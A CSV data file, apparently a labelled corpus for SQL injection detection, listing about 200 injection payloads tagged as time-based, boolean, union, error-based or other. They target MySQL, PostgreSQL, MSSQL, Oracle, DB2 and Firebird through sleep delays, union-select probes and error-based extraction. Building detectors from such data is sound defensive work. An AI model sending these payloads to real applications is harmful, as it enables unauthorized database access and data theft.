source_line,family,payload
10283,other,1  )   where 7050  =  7050
10284,time,1'||  (  select 'cgup' from dual where 5383  =  5383 waitfor delay '0:0:5'--
10285,time,"1"" rlike sleep  (  5  )   and ""rylv"" like ""rylv"
10286,boolean,"1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
10287,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--"
10288,boolean,-8515' or 1329  =  9536
10289,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#"
10290,boolean,"1'+  (  select thmg where 2546  =  2546 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
10291,boolean,"1%""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """
10292,boolean,"1   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2952  =  2952"
10293,union,1  )   where 9446  =  9446 union all select null#
10294,time,1  )   as bozx where 2160  =  2160 and sleep  (  5  )  #
10295,time,1%'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   '%'  =  '
10296,union,"1   )    )     )   union all select null,null--"
10297,union,"1  )   where 7775  =  7775 union all select null,null,null,null--"
10298,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg
10299,boolean,"1""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""epwi"" like ""epwi"
10300,boolean,"1""   )    )    and 6486  =  3843 and    (    (   ""fbka"" like ""fbka"
10301,other,1'+  (  select 'gprq' where 8928  =  8928
10302,time,1'   )    )    as azsd where 3870  =  3870 waitfor delay '0:0:5'--
10303,boolean,"1%""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """
10304,other,"1""""  (  .'.  (  ,  (  ."
10305,other,"1""   )    )    as wssb where 5772  =  5772"
10306,time,"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry"
10307,boolean,"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""cbck"" like ""cbck"
10308,time,"1%""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""%""  =  """
10309,boolean,"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'gyre'  =  'gyre"
10310,union,"1'||  (  select 'fqoz' where 9794  =  9794 union all select null,null,null,null,null--"
10311,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb"
10312,time,1 where 7890  =  7890 or sleep  (  5  )  --
10313,time,1  )   and sleep  (  5  ) 
10314,boolean,1  )   where 1013  =  1013 and 5573  =  9445#
10315,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--
10316,boolean,"1""   )    )    as ftts where 3671  =  3671 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --"
10317,other,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  +'"
10318,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790
10319,union,"-9856"" union all select 9753--"
10320,union,"-4329'  )   union all select 1353,1353,1353,1353,1353,1353#"
10321,union,"1"" union all select null,null#"
10322,error,"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --"
10323,union,"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#"
10324,other,"1""  )   where 4913  =  4913"
10325,error,"1%"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"
10326,union,"-3031"" union all select 2681#"
10327,boolean,"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa"
10328,time,"1""  )   where 7914  =  7914 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #"
10329,boolean,"1  )   as ahfj where 4776  =  4776 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
10330,boolean,1'   )    )    and 7533  =  7533 and    (    (   'ialm'  =  'ialm
10331,boolean,"1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010"
10332,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht"
10333,boolean,"1'||  (  select 'gopc' where 7386  =  7386 and make_set  (  9375  =  7963,7963   )    )   ||'"
10334,other,"1""  )   where 4588  =  4588"
10335,time,"1%""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""%""  =  """
10336,other,"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  "
10337,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--"
10338,boolean,"1'||  (  select 'flre' where 8250  =  8250 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'"
10339,error,"1'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"
10340,boolean,"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk"
10341,error,"1   )    )    as wezj where 2869  =  2869 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --"
10342,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fupe'  =  'fupe
10343,boolean,-5615'  )   where 5931  =  5931 or 8450  =  9229
10344,union,"-5143'+  (  select 'zyrr' where 8405  =  8405 union all select 8405,8405,8405,8405#"
10345,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq"
10346,union,"-8200' in boolean mode  )   union all select 3360,3360--"
10347,time,1%'  )   or sleep  (  5  )  #
10348,boolean,"1'+  (  select 'lawc' where 1171  =  1171 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
10349,time,1'||  (  select 'ypqa' where 1961  =  1961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||'
10350,union,"-3767'  )   as eefl where 8260  =  8260 union all select 8260,8260,8260,8260,8260,8260,8260#"
10351,boolean,-1127 or 7391  =  4954
10352,other,"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  "
10353,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  '%'  =  '"
10354,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #"
10355,error,-2154%' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  '
10356,union,"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#"
10357,union,-9434'  )   union all select 3106#
10358,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  8535  =  8535"
10359,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#"
10360,other,select   (  case when   (  8601  =  1220  )   then 8601 else 8601*  (  select 8601 from mysql.db  )   end  )  #
10361,boolean,"1%'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '"
10362,boolean,"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""umne"" like ""umne"
10363,boolean,1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) 
10364,union,"1%"" union all select null,null,null,null,null,null,null,null#"
10365,boolean,1 where 3027  =  3027 and 4595  =  4595#
10366,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326"
10367,boolean,"1""  )   and elt  (  4249  =  4249,7259  )   and   (  ""xgka"" like ""xgka"
10368,time,"1""  )   where 7588  =  7588 waitfor delay '0:0:5'--"
10369,time,1  )   as obzn where 7652  =  7652 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --
10370,union,"-4127%' union all select 9558,9558,9558#"
10371,error,"1""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"
10372,boolean,-4208%'   )    )     )   or 1133  =  9010--
10373,boolean,"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'yqzg'  =  'yqzg"
10374,other,1'+  (  select vfmy where 5711  =  5711
10375,other,1'||  (  select 'ldad' where 6146  =  6146 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||'
10376,boolean,1'   )    )     )   and 2006  =  2006
10377,boolean,-9100  )   or 8792  =  9550--
10378,boolean,"1""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --"
10379,boolean,"1 and elt  (  3172  =  7243,7243  )  "
10380,boolean,"-9613""   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  ""pupl""  =  ""pupl"
10381,boolean,"1'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
10382,boolean,"1'+  (  select sged where 1181  =  1181 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'"
10383,union,"1'   )    )     )   union all select null,null,null,null,null--"
10384,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'mcrt'  =  'mcrt
10385,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   --"
10386,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
10387,union,"-4679 where 9634  =  9634 union all select 9634,9634,9634,9634,9634,9634,9634--"
10388,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '"
10389,other,1' where 2967  =  2967
10390,boolean,"1  )   where 5598  =  5598 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
10391,error,"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""zoag"" like ""zoag"
10392,time,select sleep  (  5  )  # yrpn
10393,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm"
10394,union,"1%""  )   union all select null,null,null,null,null,null,null#"
10395,union,"-6548%""  )   union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--"
10396,boolean,-5352%'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '
10397,other,1 where 8135  =  8135
10398,other,"1""   )    )    as turj where 1237  =  1237"
10399,other,1'||  (  select 'gdzt' where 4950  =  4950
10400,other,"1""   )    )    as nncz where 2331  =  2331"
10401,union,"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#"
10402,boolean,"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'eimq'  =  'eimq"
10403,time,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx"
10404,union,"-8667'+  (  select ymmg where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#"
10405,error,"1' where 9605  =  9605 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --"
10406,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838
10407,error,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj"
10408,other,select   (  case when   (  6843  =  2657  )   then 6843 else 6843*  (  select 6843 from information_schema.character_sets  )   end  )  #
10409,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu"
10410,boolean,"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""ytju"" like ""ytju"
10411,other,1   )    )    as qlkf where 6635  =  6635
10412,time,waitfor delay '0:0:5'  )  ||'
10413,union,"-9569%'   )    )    union all select 8405,8405,8405,8405--"
10414,boolean,"-5755"" or 3581  =  7566"
10415,boolean,"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fktl""  =  ""fktl"
10416,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--"
10417,boolean,"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- viti"
10418,error,1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ukzb'  =  'ukzb
10419,union,"1'  )   where 2802  =  2802 union all select null,null,null#"
10420,union,1   )    )    as myxo where 1759  =  1759 union all select null#
10421,boolean,"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ksxz""  =  ""ksxz"
10422,other,select   (  case when   (  3168  =  5577  )   then 3168 else 3168*  (  select 3168 from mysql.db  )   end  )  #
10423,time,1  )   waitfor delay '0:0:5'
10424,boolean,"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'onmp'  =  'onmp"
10425,error,"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms"
10426,boolean,1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) 
10427,union,"-7234""  )   union all select 3154,3154,3154,3154#"
10428,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  --"
10429,union,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#"
10430,union,-8521'+  (  select ucim where 9003  =  9003 union all select 9003--
10431,other,"1""   )    )    order by 1--"
10432,time,"1""  )   where 9656  =  9656 and sleep  (  5  )  --"
10433,union,"-2500'   )    )     )   union all select 6853,6853,6853,6853--"
10434,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'"
10435,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'glfq' like 'glfq
10436,error,"-8353'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'ptlz'  =  'ptlz"
10437,boolean,"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"
10438,boolean,-2817%'  )   or 8255  =  3841--
10439,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--"
10440,other,"iif  (  7036  =  2370,1,1/0  )  "
10441,time,select sleep  (  5  )   and   (  'pwpc'  =  'pwpc
10442,union,"-6457 where 1764  =  1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--"
10443,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--"
10444,error,"1%""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """
10445,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok"
10446,other,"-7395%"" order by 1--"
10447,union,"1"" where 9241  =  9241 union all select null#"
10448,boolean,"1"" where 8483  =  8483 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"
10449,union,"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#"
10450,time,"1'  )   where 6248  =  6248 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"
10451,other,"1""   )    )    as fmul where 7827  =  7827"
10452,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--"
10453,boolean,-4518 where 8023  =  8023 or 6872  =  6872--
10454,error,"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --"
10455,union,"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--"
10456,boolean,"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'"
10457,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#"
10458,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg"
10459,boolean,"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  "
10460,time,"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""azmf""  =  ""azmf"
10461,boolean,"1%'  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
10462,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc"
10463,boolean,"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rbhe'  =  'rbhe"
10464,boolean,1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) 
10465,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt"
10466,boolean,"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'bmbt'  =  'bmbt"
10467,boolean,"1  )   as iovi where 3910  =  3910 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"
10468,error,"1""  )   where 4182  =  4182 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --"
10469,other,"-8065""   )    )     )   order by 1--"
10470,other,"1%""   )    )     )   order by 1#"
10471,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185"
10472,other,1'  )   as znak where 5203  =  5203
10473,error,-2348  )   as sige where 1639  =  1639 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --
10474,time,"1   )    )    as qgok where 3993  =  3993 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --"
10475,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni"
10476,union,"-1748%""   )    )     )   union all select 2987#"
10477,union,"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#"
10478,boolean,"-8344 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wjpa"
10479,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null#"
10480,boolean,"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
10481,other,"select * from generate_series  (  6414,6414,case when   (  6414  =  6455  )   then 1 else 0 end  )   limit 1--"
10482,time,"1""   )    )    as spvl where 2242  =  2242 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --"
10483,boolean,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  4557  =  4557"
10484,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"
10485,time,1'+  (  select bjav where 6923  =  6923 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
10486,boolean,"-8633"" or 5099  =  5974"
10487,boolean,end and 'hizd'  =  'hizd
